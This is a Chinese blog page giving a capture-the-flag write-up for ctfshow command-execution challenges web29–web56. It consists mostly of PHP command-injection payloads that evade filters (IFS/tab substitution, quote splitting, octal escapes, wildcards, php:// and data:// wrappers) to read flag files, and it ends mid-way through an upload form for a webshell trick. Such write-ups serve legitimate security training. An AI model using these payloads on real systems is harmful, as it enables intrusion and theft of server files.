

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
  <link rel="icon" href="/img/biaotou.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="orange">
  <meta name="keywords" content="">
  
    <meta name="description" content="前言:用了几天晚上时间把题目都过了一下，还是有值得学习的地方，炒冷饭也不失一种乐趣。web119-122的题目由于直接上传原文会对hexo的渲染模板可能造成模板注入，所以迫不得已上传的png  web29  0x01 1?c&#x3D;system(&quot;tac f*&quot;);  0x02 1?c&#x3D;echo &#96;tac f*&#96;;  web30 1?c&#x3D;echo &#96;tac f*&#96;;  web31 1">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow命令执行">
<meta property="og:url" content="https://0ran9ewww.github.io/2024/09/11/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="0raN9e的笔记">
<meta property="og:description" content="前言:用了几天晚上时间把题目都过了一下，还是有值得学习的地方，炒冷饭也不失一种乐趣。web119-122的题目由于直接上传原文会对hexo的渲染模板可能造成模板注入，所以迫不得已上传的png  web29  0x01 1?c&#x3D;system(&quot;tac f*&quot;);  0x02 1?c&#x3D;echo &#96;tac f*&#96;;  web30 1?c&#x3D;echo &#96;tac f*&#96;;  web31 1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/119.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/120.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/121.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/122.png">
<meta property="article:published_time" content="2024-09-11T14:00:00.000Z">
<meta property="article:modified_time" content="2024-09-11T14:45:58.000Z">
<meta property="article:author" content="orange">
<meta property="article:tag" content="命令执行">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/119.png">
  
  
  
  <title>ctfshow命令执行 - 0raN9e的笔记</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":"https://0ran9e.fun","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>0raN9e的blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/background.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ctfshow命令执行"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-09-11 22:00" pubdate>
          2024年9月11日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.3k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          53 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">ctfshow命令执行</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2024年9月11日 晚上
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>前言:用了几天晚上时间把题目都过了一下，还是有值得学习的地方，炒冷饭也不失一种乐趣。web119-122的题目由于直接上传原文会对hexo的渲染模板可能造成模板注入，所以迫不得已上传的png</p>
<h2 id="web29"><a class="markdownIt-Anchor" href="#web29"></a> web29</h2>
<h3 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=system(<span class="hljs-string">&quot;tac f*&quot;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">tac</span> f*`;<br></code></pre></td></tr></table></figure>
<h2 id="web30"><a class="markdownIt-Anchor" href="#web30"></a> web30</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">tac</span> f*`;<br></code></pre></td></tr></table></figure>
<h2 id="web31"><a class="markdownIt-Anchor" href="#web31"></a> web31</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span>`<span class="hljs-built_in">tac</span>%09f*`;<br></code></pre></td></tr></table></figure>
<h2 id="web32"><a class="markdownIt-Anchor" href="#web32"></a> web32</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
<h2 id="web33"><a class="markdownIt-Anchor" href="#web33"></a> web33</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
<h2 id="web34"><a class="markdownIt-Anchor" href="#web34"></a> web34</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
<h2 id="web35"><a class="markdownIt-Anchor" href="#web35"></a> web35</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
<h2 id="web36"><a class="markdownIt-Anchor" href="#web36"></a> web36</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
<h2 id="web37"><a class="markdownIt-Anchor" href="#web37"></a> web37</h2>
<h3 id="0x01-2"><a class="markdownIt-Anchor" href="#0x01-2"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;tac fla*.php&quot;</span>)?&gt;<br></code></pre></td></tr></table></figure>
<h3 id="0x02-2"><a class="markdownIt-Anchor" href="#0x02-2"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<br></code></pre></td></tr></table></figure>
<h2 id="web38"><a class="markdownIt-Anchor" href="#web38"></a> web38</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<br></code></pre></td></tr></table></figure>
<h2 id="web39"><a class="markdownIt-Anchor" href="#web39"></a> web39</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain,&lt;?php system(<span class="hljs-string">&quot;tac fla*.php&quot;</span>)?&gt;<br></code></pre></td></tr></table></figure>
<p>提前闭合</p>
<h2 id="web40"><a class="markdownIt-Anchor" href="#web40"></a> web40</h2>
<h3 id="0x01-3"><a class="markdownIt-Anchor" href="#0x01-3"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure>
<h3 id="0x02-3"><a class="markdownIt-Anchor" href="#0x02-3"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">eval</span>(end(current(get_defined_vars())));&amp;b=system(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="web41"><a class="markdownIt-Anchor" href="#web41"></a> web41</h2>
<p>利用羽师傅的脚本直接跑出答案</p>
<h2 id="web42"><a class="markdownIt-Anchor" href="#web42"></a> web42</h2>
<p>%0a截断后面无用的内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> flag.php%0a<br></code></pre></td></tr></table></figure>
<h2 id="web43"><a class="markdownIt-Anchor" href="#web43"></a> web43</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> flag.php%0a<br></code></pre></td></tr></table></figure>
<h2 id="web44"><a class="markdownIt-Anchor" href="#web44"></a> web44</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> fla?.php%0a<br></code></pre></td></tr></table></figure>
<h2 id="web45"><a class="markdownIt-Anchor" href="#web45"></a> web45</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>%09fla?.php%0a<br></code></pre></td></tr></table></figure>
<h2 id="web46"><a class="markdownIt-Anchor" href="#web46"></a> web46</h2>
<h3 id="0x01-4"><a class="markdownIt-Anchor" href="#0x01-4"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h3 id="0x02-4"><a class="markdownIt-Anchor" href="#0x02-4"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h2 id="web47"><a class="markdownIt-Anchor" href="#web47"></a> web47</h2>
<h3 id="0x01-5"><a class="markdownIt-Anchor" href="#0x01-5"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h3 id="0x02-5"><a class="markdownIt-Anchor" href="#0x02-5"></a> 0x02</h3>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?c<span class="hljs-punctuation">=</span>nl&lt;fl&#x27;&#x27;ag.php<span class="hljs-string">||</span><br></code></pre></td></tr></table></figure>
<h2 id="web48"><a class="markdownIt-Anchor" href="#web48"></a> web48</h2>
<h3 id="0x01-6"><a class="markdownIt-Anchor" href="#0x01-6"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h3 id="0x02-6"><a class="markdownIt-Anchor" href="#0x02-6"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h2 id="web49"><a class="markdownIt-Anchor" href="#web49"></a> web49</h2>
<h3 id="0x01-7"><a class="markdownIt-Anchor" href="#0x01-7"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h3 id="0x02-7"><a class="markdownIt-Anchor" href="#0x02-7"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h2 id="web50"><a class="markdownIt-Anchor" href="#web50"></a> web50</h2>
<h3 id="0x01-8"><a class="markdownIt-Anchor" href="#0x01-8"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h3 id="0x02-8"><a class="markdownIt-Anchor" href="#0x02-8"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h2 id="web51"><a class="markdownIt-Anchor" href="#web51"></a> web51</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure>
<h2 id="web52"><a class="markdownIt-Anchor" href="#web52"></a> web52</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">ls</span><span class="hljs-variable">$IFS</span>/||<br>?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">$IFS</span>/fla?||<br></code></pre></td></tr></table></figure>
<h2 id="web53"><a class="markdownIt-Anchor" href="#web53"></a> web53</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=ca<span class="hljs-string">&#x27;&#x27;</span>t<span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<br></code></pre></td></tr></table></figure>
<h2 id="web54"><a class="markdownIt-Anchor" href="#web54"></a> web54</h2>
<h3 id="0x01-9"><a class="markdownIt-Anchor" href="#0x01-9"></a> 0x01</h3>
<p>复制粘贴型</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">mv</span><span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<span class="hljs-variable">$&#123;IFS&#125;</span>a.txt<br></code></pre></td></tr></table></figure>
<h3 id="0x02-9"><a class="markdownIt-Anchor" href="#0x02-9"></a> 0x02</h3>
<p>全局查找，<code>-r</code>递归文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=grep<span class="hljs-variable">$&#123;IFS&#125;</span>-r<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&#x27;fla&#x27;</span><span class="hljs-variable">$&#123;IFS&#125;</span>.<br></code></pre></td></tr></table></figure>
<h2 id="web55"><a class="markdownIt-Anchor" href="#web55"></a> web55</h2>
<h3 id="0x01-10"><a class="markdownIt-Anchor" href="#0x01-10"></a> 0x01</h3>
<p>八进制转化</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=$<span class="hljs-string">&#x27;\154\163&#x27;</span> <span class="hljs-comment"># ls</span><br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=$<span class="hljs-string">&#x27;\164\141\143&#x27;</span> $<span class="hljs-string">&#x27;\146\154\141\147\56\160\150\160&#x27;</span> <span class="hljs-comment"># tac flag.php</span><br></code></pre></td></tr></table></figure>
<h3 id="0x02-10"><a class="markdownIt-Anchor" href="#0x02-10"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。<br><br>但因为字母不能传入，我们需要使用通配符?来进行代替<br><br>?c=/bin/base64 flag.php<br><br>替换后变成<br><br>?c=/???/????64 ????.???<br></code></pre></td></tr></table></figure>
<h2 id="web56"><a class="markdownIt-Anchor" href="#web56"></a> web56</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这题由于基本都禁了，需要用到文件上传到临时文件，利用glob通配符进行<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">无字母数字webshell之提高篇</a>，已知A-Z在ASCII里面是被@和[包括的，那么可以使用<code>[@-[]</code>来表示，虽然是随机的，那么可以用<code>?c=.%20/???/????????[@-[] </code>进行匹配文件，这里需要上传一个文件，利用简单的html进行</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://e76b0b60-1e1a-4cc2-b39e-e3548d1a6fcc.challenge.ctf.show/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span 